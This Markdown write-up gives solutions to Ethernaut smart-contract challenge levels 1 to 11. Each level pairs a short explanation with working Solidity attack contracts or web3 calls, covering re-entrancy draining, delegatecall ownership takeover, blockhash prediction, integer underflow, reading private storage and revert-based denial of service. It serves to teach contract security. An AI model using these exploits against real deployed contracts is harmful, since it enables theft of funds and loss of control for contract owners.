# Ethernaut solution

## 1. Fallback
Abusing erroneous logic between contract functions and fallback function.
```
await contract.contribute({value: 1234});
await contract.sendTransaction({value: 1234});
await contract.withdraw();
```

## 2. Fallout
Constructor is spelled wrongly so it becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0 and above.
```
await contract.Fal1out({value: 1234});
await contract.sendAllocation(await contract.owner());
```

## 3. Coinflip
Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.

Note: For some reason, I can't seem to call these functions more than once in the same function call i.e. another function that calls one of these malicious functions multiple times in one function call.
``` 
pragma solidity ^0.6.0;
import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract AttackCoinFlip {
    using SafeMath for uint;
    
    address public targetContract;
    
    constructor(address _targetContract) public {
        targetContract = _targetContract;
    }
    
    function attackFlipWithContract() public{
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(targetContract).flip(side);
    }
    
    function attackFlipWithout() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
        bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip == 1 ? true : false);
        (bool success, ) = targetContract.call(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 4. Telephone
When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin.
```
pragma solidity ^0.6.0;
contract AttackTelephone {
    address public telephone;
    
    constructor(address _telephone) public {
        telephone = _telephone;
    }
    
    function changeBadOwner(address badOwner) public {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", badOwner);
        (bool success, ) = telephone.call(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

## 5. Token
No integer over/underflow protection. Always use [safemath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol) libraries. As long as you pass a value > 20, the condition in the first require statement will underflow and it will always pass. 
```
await contract.transfer(instance, 25)
```

## 6. Delegation
DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract. Since msg.sender, msg.data, msg.value are all preserved when performing a DelegateCall, you just needed to pass in a malicious msg.data i.e. the encoded payload of `pwn()` function to gain ownership of the `Delegation` contract.
```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

await contract.sendTransaction({
    data: payload
});
```

## 7. Force
You can easily forcibly send ether to a contract. Read [this](https://consensys.github.io/smart-contract-best-practices/known_attacks/#forcibly-sending-ether-to-a-contract) to learn more.
```
pragma solidity ^0.6.0;

contract AttackForce {
    
    constructor(address payable _victim) public payable {
        selfdestruct(_victim);
    }
}
```

## 8. Vault
Your private variables are private if you try to access it the normal way e.g. via another contract but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, you can still access it based on its index in the smart contract. Learn more about this [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage).x
```
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```

## 9. King
This is a classic example of DDoS with unexpected revert when part of the logic in the victim's contract involves transferring ether to the previous "lead", which in this case is the king. A malicious user would create a smart contract with either:

- a `fallback` / `receive` function that does `revert()`
- or the absence of a `fallback` / `receive` function

Once the malicious user uses this smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter howm uch ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`
```
pragma solidity ^0.6.0;

contract AttackForce {
    
    constructor(address payable _victim) public payable {
        _victim.call.gas(1000000).value(1 ether)("");
    }
    
    receive() external payable {
        revert();
    }
}
```

## 10. Re-entrancy
The same hack as the DAO hack. Due to the ordering of the transactions, the malicious contract is able to keep calling the withdraw function as the internal state is only updated after the transfer is done. When the call.value is processed, the control is handed back to the `fallback` function of the malicious contract which then calls the withdraw function again. Note that the number of times the fallback function runs is based on the amount of gas submitted when you call `maliciousWithdraw()`. 

Note: You need to use `uint256` instead of `uint` when encoding the signature.
```
pragma solidity ^0.6.0;

contract AttackReentrancy {
    address payable victim;
    
    constructor(address payable _victim) public payable {
        victim = _victim;
        
        // Call Donate
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
        victim.call.value(msg.value)(payload);
    }
    
    function maliciousWithdraw() public payable {
        // Call withdraw
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0.5 ether);
        victim.call(payload);
    }
    
    fallback() external payable {
        maliciousWithdraw();
    }
    
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}
```

## 11. Elevator
Since `building.isLastFloor()` is not a view function, you could implement it in such a way where it returns a different value everytime it is called, even if it is called in the same function. Moreover, even if it were to be changed to a view function, you could also still [attack it](https://github.com/OpenZeppelin/ethernaut/pull/123#discussion_r317367511).

Note: You don't have to inherit an interface for the sake of doing it. It helps with the abstract constract checks when the contract is being compiled. As you can see in my implementation below, I just needed to implement `isLastFloor()` because at the end of the day, it still gets encoded into a hexidecimal function signature and as long as this particular signature exists in the contract, it will be called with the specified params. 

Sometimes `.call()` gives you a bad estimation of the gas required so you might have to manually configure how much gas you want to send along with your transaction. 
```
pragma solidity ^0.6.0;

contract AttackElevator  {
    bool public flag; 
    
    function isLastFloor(uint) public returns(bool) {
        flag = !flag;
        return !flag;
    }
    
    function forceTopFloor(address _victim) public {
        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
        _victim.call(payload);
    }
   
}
```

## 11. Privacy
This level is very similar to that of the level 8 Vault. In order to unlock the function, you need to be able to retrieve the value stored at `data[2]` but you need to first determine what position it is at. You can learn more about how storage variables are stored on the smart contract [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage). From that, we can tell that `data[2]` is stored at index 5! It's not supposed to be at index 4 because arrays are 0 based so when you want to get value at index 2, you're actually asking for the 3 value of the array i.e. index 5!! Astute readers will also notice that the password is actually casted to bytes16! So you'd need to know what gets truncated when you go from bytes32 to byets16. You can learn about what gets truncated during type casting [here](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).

Note: Just a bit more details about the packing of storage variables. The 2 `uint8` and 1 `uint16` are packed together on storage according to the order in which they appeared in the smart contract. In my case, when i did `await web3.eth.getStorageAt(instance, 2)`, I had a return value of `0x000000000000000000000000000000000000000000000000000000004931ff0a`. The last 4 characters of your string should be the same as mine because our contracts both have the same values for `flattening` and `denomination`. 

`flattening` has a value of 10 and its hexidecimal representation is `0a` while `denomination` has a value of 255 and has a hexidecimal representation of `ff`. The confusing part is the last one which is supposed to represent `awkwardness` which is of type `uint16`. Since `now` returns you a uint256 (equivalent of block.timestamp i.e. the number of seconds since epoch), when you convert `4931` as a hex into decimals, you get the values `18737`. This value can be obtained by doing `epochTime % totalNumberOfPossibleValuesForUint16` i.e. `1585269041 % 65536 = 18737`. The biggest value for `uint16` is `65535` but to determine all possible values, you need to add `1` to `65535` more to also include 0. Hopefully this explanation helps you to better understand how values are packed at the storage level!
```
var data = await web3.eth.getStorageAt(instance, 5);
var key = data.slice(2, 34);
await contract.unlock(key);
```



